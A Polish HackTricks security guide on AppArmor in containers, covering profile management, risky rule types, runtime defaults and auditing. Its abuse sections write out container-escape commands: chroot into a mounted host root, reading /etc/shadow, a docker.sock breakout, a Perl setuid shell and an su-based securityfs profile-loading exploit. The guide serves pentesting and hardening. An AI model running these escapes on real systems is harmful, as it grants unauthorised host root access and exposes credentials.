# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Omówienie

AppArmor to system **Mandatory Access Control**, który nakłada ograniczenia za pomocą profili przypisanych do poszczególnych programów. W przeciwieństwie do tradycyjnych kontroli DAC, w dużej mierze zależnych od właściciela pliku oraz przynależności do grup, AppArmor pozwala kernelowi egzekwować politykę przypisaną do samego procesu. W środowiskach kontenerowych ma to znaczenie, ponieważ workload może mieć wystarczające tradycyjne uprawnienia, by podjąć próbę wykonania danej czynności, a mimo to może jej odmówić profil AppArmor, który nie zezwala na dostęp do odpowiedniej ścieżki, montowanie, określone zachowanie sieciowe lub użycie capabilities.

Najważniejszą kwestią jest to, że AppArmor jest oparty na **ścieżkach**. Dostęp do systemu plików ocenia na podstawie reguł ścieżek, a nie etykiet, jak robi to SELinux. Dzięki temu jest przystępny i skuteczny, ale oznacza też, że należy uważnie przyjrzeć się bind mountom i alternatywnym układom ścieżek. Jeśli ta sama zawartość hosta stanie się dostępna pod inną ścieżką, działanie polityki może różnić się od początkowych oczekiwań operatora.

## Rola w izolacji kontenerów

Przeglądy bezpieczeństwa kontenerów często kończą się na capabilities i seccomp, ale AppArmor nadal ma znaczenie po tych kontrolach. Wyobraź sobie kontener z większymi uprawnieniami, niż powinien mieć, albo workload, który z powodów operacyjnych wymagał jeszcze jednego capability. AppArmor nadal może ograniczać dostęp do plików, zachowanie podczas montowania, sieć i wzorce wykonywania, blokując oczywistą ścieżkę nadużycia. Dlatego wyłączenie AppArmor „tylko po to, żeby aplikacja działała” może po cichu przekształcić konfigurację, która jest jedynie ryzykowna, w konfigurację podatną na aktywne wykorzystanie.

## Laboratorium

Aby sprawdzić, czy AppArmor jest aktywny na hoście, użyj:

```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```

Aby sprawdzić, w jakim kontekście działa bieżący proces kontenera:

```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```

Różnica jest pouczająca. W normalnym przypadku proces powinien mieć kontekst AppArmor powiązany z profilem wybranym przez runtime. W przypadku `unconfined` ta dodatkowa warstwa ograniczeń znika.

Możesz też sprawdzić, co Docker uważa, że zastosował:

```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```

## Użycie w czasie działania

Docker może zastosować domyślny lub niestandardowy profil AppArmor, jeśli host go obsługuje. Podman może również integrować się z AppArmor w systemach opartych na AppArmor, choć w dystrybucjach, w których priorytetem jest SELinux, często większą rolę odgrywa inny system MAC. Kubernetes może udostępniać zasady AppArmor na poziomie workloadu w węzłach, które faktycznie obsługują AppArmor. LXC i powiązane z nim środowiska kontenerów systemowych z rodziny Ubuntu również szeroko korzystają z AppArmor.

W praktyce AppArmor nie jest „funkcją Dockera”. To funkcja jądra hosta, którą różne środowiska uruchomieniowe mogą zdecydować się stosować. Jeśli host jej nie obsługuje albo środowisko uruchomieniowe skonfigurowano tak, by działało bez ograniczeń, domniemana ochrona w rzeczywistości nie istnieje.

W przypadku Kubernetes nowoczesnym API jest `securityContext.appArmorProfile`. Od Kubernetes `v1.30` starsze adnotacje AppArmor w wersji beta są przestarzałe. Na obsługiwanych hostach domyślnym profilem jest `RuntimeDefault`, a `Localhost` wskazuje profil, który musi być już załadowany w węźle. Ma to znaczenie podczas przeglądu, ponieważ manifest może wyglądać na uwzględniający AppArmor, a mimo to całkowicie polegać na obsłudze po stronie węzła i wstępnie załadowanych profilach.<sup>[[1]](#references)</sup>

Jednym z subtelnych, ale przydatnych szczegółów operacyjnych jest to, że jawne ustawienie `appArmorProfile.type: RuntimeDefault` jest bardziej restrykcyjne niż pominięcie tego pola. Jeśli pole jest jawnie ustawione, a węzeł nie obsługuje AppArmor, żądanie powinno zostać odrzucone podczas admission. Jeśli pole zostanie pominięte, workload może nadal działać w węźle bez AppArmor i po prostu nie otrzymać tej dodatkowej warstwy ograniczeń. Z punktu widzenia atakującego to dobry powód, by sprawdzić zarówno manifest, jak i rzeczywisty stan węzła.<sup>[[1]](#references)</sup>

Na hostach AppArmor obsługujących Dockera najbardziej znanym profilem domyślnym jest `docker-default`. Profil ten jest generowany na podstawie szablonu AppArmor z Moby i jest istotny, ponieważ wyjaśnia, dlaczego niektóre PoC oparte na capabilities nadal zawodzą w domyślnym kontenerze. Ogólnie rzecz biorąc, `docker-default` zezwala na zwykłą komunikację sieciową, blokuje zapisy w znacznej części `/proc`, odmawia dostępu do wrażliwych części `/sys`, blokuje operacje montowania i ogranicza ptrace, aby nie służyło do ogólnego sondowania hosta. Zrozumienie tej podstawowej konfiguracji pomaga odróżnić „kontener ma `CAP_SYS_ADMIN`” od „kontener może faktycznie użyć tej capability do interakcji z interesującymi mnie interfejsami jądra”.

## Zarządzanie profilami

Profile AppArmor są zwykle przechowywane w katalogu `/etc/apparmor.d/`. Powszechną konwencją nazewnictwa jest zastępowanie ukośników w ścieżce pliku wykonywalnego kropkami. Na przykład profil dla `/usr/bin/man` jest zwykle przechowywany jako `/etc/apparmor.d/usr.bin.man`. Ten szczegół ma znaczenie zarówno podczas obrony, jak i oceny bezpieczeństwa, ponieważ po poznaniu nazwy aktywnego profilu często można szybko znaleźć odpowiadający mu plik na hoście.

Przydatne polecenia do zarządzania po stronie hosta:

```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```

Powodem, dla którego te polecenia mają znaczenie w kontekście bezpieczeństwa kontenerów, jest to, że wyjaśniają, jak profile są faktycznie tworzone, ładowane, przełączane w tryb complain i modyfikowane po zmianach w aplikacji. Jeśli operator ma zwyczaj przełączać profile w tryb complain podczas rozwiązywania problemów i zapomina przywrócić egzekwowanie zasad, kontener może wyglądać na chroniony w dokumentacji, a w rzeczywistości działać ze znacznie luźniejszymi ograniczeniami.

### Tworzenie i aktualizowanie profili

`aa-genprof` może obserwować działanie aplikacji i pomagać w interaktywnym generowaniu profilu:

```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```

`aa-easyprof` może wygenerować profil szablonowy, który można później załadować za pomocą `apparmor_parser`:

```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```

Gdy plik binarny ulega zmianie i polityka wymaga aktualizacji, `aa-logprof` może odtworzyć odmowy znalezione w logach i pomóc operatorowi zdecydować, czy je dopuścić, czy zablokować:

```bash
sudo aa-logprof
```

### Dzienniki

Odmowy AppArmor są często widoczne w `auditd`, syslogu lub narzędziach takich jak `aa-notify`:

```bash
sudo aa-notify -s 1 -v
```

Jest to przydatne z punktu widzenia operacyjnego i ofensywnego. Obrońcy używają tego do dopracowywania profili. Atakujący wykorzystują to, aby ustalić, która dokładnie ścieżka lub operacja jest blokowana oraz czy to AppArmor blokuje łańcuch exploita.

### Identyfikowanie dokładnego pliku profilu

Gdy środowisko uruchomieniowe pokazuje konkretną nazwę profilu AppArmor dla kontenera, często warto ustalić, z którym plikiem profilu na dysku jest ona powiązana:

```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```

Jest to szczególnie przydatne podczas przeglądu po stronie hosta, ponieważ pozwala powiązać informację „kontener twierdzi, że działa w profilu `lowpriv`” z informacją „rzeczywiste reguły znajdują się w tym konkretnym pliku, który można skontrolować lub ponownie załadować”.

### Reguły o dużym znaczeniu do skontrolowania

Jeśli możesz odczytać profil, nie poprzestawaj na prostych liniach `deny`. Kilka typów reguł istotnie wpływa na to, jak skuteczny będzie AppArmor w ochronie przed próbą ucieczki z kontenera:<sup>[[2]](#references)</sup>

- `ux` / `Ux`: uruchomienie docelowego pliku binarnego bez ograniczeń. Jeśli dostępny helper, shell lub interpreter jest dozwolony przez `ux`, zwykle warto przetestować go jako pierwszy.
- `px` / `Px` oraz `cx` / `Cx`: przejście do innego profilu podczas exec. Nie są one automatycznie niebezpieczne, ale warto je skontrolować, ponieważ przejście może prowadzić do profilu o znacznie szerszych uprawnieniach niż bieżący.
- `change_profile`: umożliwia zadaniu przejście do innego załadowanego profilu — natychmiast lub przy następnym exec. Jeśli profil docelowy jest słabszy, może to stać się zamierzoną drogą ucieczki z restrykcyjnej domeny.
- `flags=(complain)`, `flags=(unconfined)` lub nowsze `flags=(prompt)`: powinny wpływać na poziom zaufania do profilu. `complain` rejestruje odmowy zamiast ich egzekwować, `unconfined` usuwa granicę ochrony, a `prompt` zależy od ścieżki decyzyjnej w przestrzeni użytkownika, a nie wyłącznie od odmowy wymuszanej przez kernel.
- `userns` lub `userns create,`: nowsze zasady AppArmor mogą kontrolować tworzenie przestrzeni nazw użytkownika. Jeśli profil kontenera wyraźnie na nie zezwala, zagnieżdżone przestrzenie nazw użytkownika pozostają możliwe nawet wtedy, gdy platforma wykorzystuje AppArmor jako element strategii wzmacniania zabezpieczeń.

Przydatne polecenie grep po stronie hosta:

```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

Ten rodzaj audytu jest często bardziej przydatny niż analizowanie setek zwykłych reguł dotyczących plików. Jeśli breakout zależy od uruchomienia programu pomocniczego, wejścia do nowej przestrzeni nazw lub ucieczki do mniej restrykcyjnego profilu, odpowiedź często kryje się w tych regułach dotyczących przejść, a nie w oczywistych wierszach w stylu `deny /etc/shadow r`.

## Błędne konfiguracje

Najbardziej oczywistym błędem jest `apparmor=unconfined`. Administratorzy często ustawiają tę opcję podczas debugowania aplikacji, która nie działała, ponieważ profil prawidłowo zablokował coś niebezpiecznego lub nieoczekiwanego. Jeśli ta flaga pozostanie w konfiguracji produkcyjnej, cała warstwa MAC zostanie praktycznie wyłączona.

Innym subtelnym problemem jest założenie, że bind mounty są nieszkodliwe, ponieważ uprawnienia plików wyglądają normalnie. Ponieważ AppArmor opiera się na ścieżkach, udostępnianie ścieżek hosta pod alternatywnymi lokalizacjami montowania może prowadzić do konfliktów z regułami ścieżek. Trzecim błędem jest zapominanie, że nazwa profilu w pliku konfiguracyjnym niewiele znaczy, jeśli jądro hosta faktycznie nie egzekwuje reguł AppArmor.

## Nadużycia

Gdy AppArmor jest wyłączony, operacje, które wcześniej były ograniczone, mogą nagle zacząć działać: odczyt wrażliwych ścieżek przez bind mounty, dostęp do części procfs lub sysfs, do których dostęp powinien być utrudniony, wykonywanie operacji związanych z montowaniem, jeśli pozwalają na nie również capabilities/seccomp, albo korzystanie ze ścieżek, które profil normalnie by blokował. AppArmor często wyjaśnia, dlaczego próba breakout oparta na capabilities, która teoretycznie „powinna zadziałać”, w praktyce kończy się niepowodzeniem. Wyłącz AppArmor, a ta sama próba może zacząć się powodzić.

Jeśli podejrzewasz, że to AppArmor powstrzymuje łańcuch nadużyć oparty na path traversal, bind mountach lub montowaniu, zwykle warto najpierw porównać, do czego można uzyskać dostęp z profilem i bez niego. Na przykład, jeśli ścieżka hosta jest zamontowana wewnątrz kontenera, zacznij od sprawdzenia, czy możesz ją przeszukać i odczytać:

```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```

Jeśli kontener ma również niebezpieczną capability, taką jak `CAP_SYS_ADMIN`, jednym z najbardziej praktycznych testów jest sprawdzenie, czy to AppArmor blokuje operacje mount lub dostęp do wrażliwych systemów plików jądra:

```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```

W środowiskach, w których ścieżka hosta jest już dostępna przez bind mount, utrata ochrony AppArmor może również zmienić problem ujawnienia informacji tylko do odczytu w bezpośredni dostęp do plików hosta:

```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```

Celem tych poleceń nie jest pokazanie, że sam AppArmor umożliwia ucieczkę z kontenera. Chodzi o to, że po usunięciu AppArmor wiele metod nadużyć związanych z systemem plików i montowaniem można od razu przetestować.

### Pełny przykład: AppArmor wyłączony + główny katalog hosta zamontowany

Jeśli główny katalog hosta jest już zamontowany w kontenerze przez bind mount pod ścieżką `/host`, usunięcie AppArmor może zmienić zablokowaną metodę nadużycia systemu plików w pełną ucieczkę z kontenera na hosta:

```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```

Gdy shell działa za pośrednictwem systemu plików hosta, obciążenie w praktyce przekroczyło granicę kontenera:

```bash
id
hostname
cat /etc/shadow | head
```

### Pełny przykład: AppArmor wyłączony + socket runtime

Jeśli prawdziwą barierą było AppArmor chroniące stan runtime, zamontowany socket może wystarczyć do pełnej ucieczki:

```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```

Dokładna ścieżka zależy od punktu montowania, ale rezultat jest ten sam: AppArmor nie blokuje już dostępu do runtime API, a runtime API może uruchomić kontener zagrażający hostowi.

### Pełny przykład: obejście bind-mount oparte na ścieżce

Ponieważ AppArmor działa w oparciu o ścieżki, ochrona `/proc/**` nie chroni automatycznie tej samej zawartości hostowego procfs, gdy można uzyskać do niej dostęp pod inną ścieżką:

```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```

Wpływ zależy od tego, co dokładnie jest zamontowane i czy alternatywna ścieżka omija również inne zabezpieczenia, ale ten schemat jest jednym z najczytelniejszych powodów, dla których AppArmor należy oceniać w połączeniu z układem montowań, a nie w oderwaniu od niego.

### Pełny przykład: Shebang Bypass

AppArmor może przypisać profil do ścieżki wykonywanego skryptu, a nie do interpretera wskazanego w jego shebangu. Z kolei bezpośrednie uruchomienie interpretera może wybrać profil tego interpretera. [Opiekun AppArmor opisuje tę różnicę](https://bugs.launchpad.net/apparmor/+bug/1911431). Historyczny przykład dotyczył skryptu, którego pierwsza linia wskazywała na interpreter objęty ograniczeniami:

```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```

Przykład jest jedynie przypadkiem, w którym capability pliku interpretera może stać się efektywne, a rzeczywiste przypisanie exec skryptu dopuszcza tę operację. Sprawdź załadowaną politykę i etykietę procesu, zbiór ograniczający capabilities, `no_new_privs` oraz stan `nosuid` montowania; sama nazwa pliku profilu lub wpis `cap_setuid+ep` nie dowodzą, że przejście jest możliwe. Łańcuchy interpreterów i alternatywne ścieżki wykonania wymagają osobnej analizy.

## Pliki kontroli polityki jako prymityw uprzywilejowanego zapisu

W podatnych jądrach AppArmor nieuprzywilejowany użytkownik może otworzyć plik securityfs `.load`, `.replace` lub `.remove` do zapisu, ale bezpośrednie `write()` kończy się niepowodzeniem, ponieważ uprawnienie administratora polityki jest sprawdzane w chwili zapisu. Jeśli taki deskryptor zostanie odziedziczony jako stdout lub stderr przez pomocniczy program setuid, który zapisze bajty kontrolowane przez atakującego, jądro użyje poświadczeń tego programu. Dzięki temu program staje się *uprzywilejowanym zapisującym* dane polityki, a nie sposobem na ogólne nadanie wywołującemu uprawnień roota. Qualys wykazał, że `su -P` może przekazywać bajty z polecenia uruchomionego jako ten sam użytkownik przez swoją uprzywilejowaną ścieżkę PTY; ta metoda wymaga ustawionego hasła do konta użytkownika. Sprawdź poprawki zainstalowane dla jądra i `su`, zamiast uznawać, że uprawnienia do zapisu dla wszystkich dowodzą podatności.<sup>[[3]](#references)[[4]](#references)</sup>

W jednorazowym środowisku testowym z podatnym jądrem i programem pomocniczym poniższy przykład tworzy, a następnie usuwa profil testowy. Powłoka otwiera każdy plik kontrolny, zanim `su` zapisze do niego dane; `stty raw` zapobiega modyfikowaniu bajtów skompilowanego profilu podczas przekazywania ich przez PTY. Nie uruchamiaj testu na profilu produkcyjnym.<sup>[[3]](#references)</sup>

```bash
printf '/usr/bin/true {\n}\n' > /tmp/ht-aa-probe
apparmor_parser -K -o /tmp/ht-aa-probe.pf /tmp/ht-aa-probe
su -P -c 'stty raw && cat /tmp/ht-aa-probe.pf' "$USER" > /sys/kernel/security/apparmor/.load
grep '/usr/bin/true ' /sys/kernel/security/apparmor/profiles
su -P -c 'stty raw && printf %s /usr/bin/true' "$USER" > /sys/kernel/security/apparmor/.remove
```

Ten sam prymityw może zastąpić istniejący profil. Na przykład profil zezwalający launcherowi na `userns` może usunąć ograniczenie AppArmor dotyczące przestrzeni nazw użytkowników, ale nie nadaje uprawnień host-root; nadal mają znaczenie rzeczywiste ustawienia sysctl przestrzeni nazw i inne mechanizmy kontroli. Może też usunąć ograniczenia nałożone na proces docelowy. Zapoznaj się z [kontrolami ekspozycji jądra](../../../main-system-information/kernel-vulnerability-assessment.md) oraz [omówieniem Linux Hardening](../../../), aby poznać szerszy przebieg eskalacji uprawnień.<sup>[[3]](#references)[[4]](#references)</sup>

## Sprawdzenia

Celem tych kontroli jest szybkie uzyskanie odpowiedzi na trzy pytania: czy AppArmor jest włączony na hoście, czy bieżący proces jest objęty ograniczeniami oraz czy środowisko uruchomieniowe rzeczywiście zastosowało profil do tego kontenera?

```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

Co jest tutaj interesujące:

- Jeśli `/proc/self/attr/current` pokazuje `unconfined`, workload nie korzysta z ograniczeń AppArmor.
- Jeśli `aa-status` pokazuje, że AppArmor jest wyłączony lub niezaładowany, nazwa profilu w konfiguracji runtime’u jest w większości kosmetyczna.
- Jeśli `docker inspect` pokazuje `unconfined` lub nieoczekiwany profil niestandardowy, często właśnie dlatego działa ścieżka nadużycia oparta na systemie plików lub montowaniu.
- Jeśli `/sys/kernel/security/apparmor/profiles` nie zawiera oczekiwanego profilu, sama konfiguracja runtime’u lub orkiestratora nie wystarczy.
- Jeśli rzekomo wzmocniony profil zawiera reguły takie jak `ux`, szerokie `change_profile`, `userns` lub `flags=(complain)`, praktyczna granica bezpieczeństwa może być znacznie słabsza, niż sugeruje nazwa profilu.

Jeśli kontener ma już podwyższone uprawnienia z powodów operacyjnych, pozostawienie AppArmor włączonego często decyduje o tym, czy mamy do czynienia z kontrolowanym wyjątkiem, czy ze znacznie poważniejszą awarią bezpieczeństwa.

## Domyślne ustawienia runtime’u

| Runtime / platforma | Stan domyślny | Domyślne działanie | Typowe ręczne osłabienie zabezpieczeń |
| --- | --- | --- | --- |
| Docker Engine | Domyślnie włączony na hostach obsługujących AppArmor | Używa profilu AppArmor `docker-default`, o ile nie zostanie on nadpisany | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Zależny od hosta | AppArmor jest obsługiwany przez `--security-opt`, ale dokładne ustawienie domyślne zależy od hosta/runtime’u i jest mniej uniwersalne niż udokumentowany profil `docker-default` w Dockerze | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Warunkowe ustawienie domyślne | Jeśli `appArmorProfile.type` nie jest określone, domyślną wartością jest `RuntimeDefault`, ale jest ono stosowane tylko wtedy, gdy AppArmor jest włączony na węźle | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` ze słabym profilem, węzły bez obsługi AppArmor |
| containerd / CRI-O w Kubernetes | Zależny od obsługi przez węzeł/runtime | Typowe runtime’y obsługiwane przez Kubernetes obsługują AppArmor, ale faktyczne egzekwowanie zasad nadal zależy od obsługi przez węzeł i ustawień workloadu | Tak samo jak w wierszu dotyczącym Kubernetes; bezpośrednia konfiguracja runtime’u również może całkowicie pominąć AppArmor |

W przypadku AppArmor najważniejszą zmienną jest często **host**, a nie tylko runtime. Ustawienie profilu w manifeście nie zapewnia ograniczeń na węźle, na którym AppArmor nie jest włączony.



## References

- [1] [Kontekst bezpieczeństwa Kubernetes: pola profilu AppArmor i działanie zależne od obsługi przez węzeł](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [2] [Strona podręcznika `apparmor.d(5)` dla Ubuntu 24.04: przejścia przy `exec`, `change_profile`, `userns` i flagi profilu](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
- [3] [Nota techniczna Qualys dotycząca CrackArmor](https://cdn2.qualys.com/advisory/2026/03/10/crack-armor.txt)
- [4] [Baza wiedzy o podatności CrackArmor w Ubuntu](https://ubuntu.com/security/vulnerabilities/crackarmor)
{{#include ../../../../banners/hacktricks-training.md}}
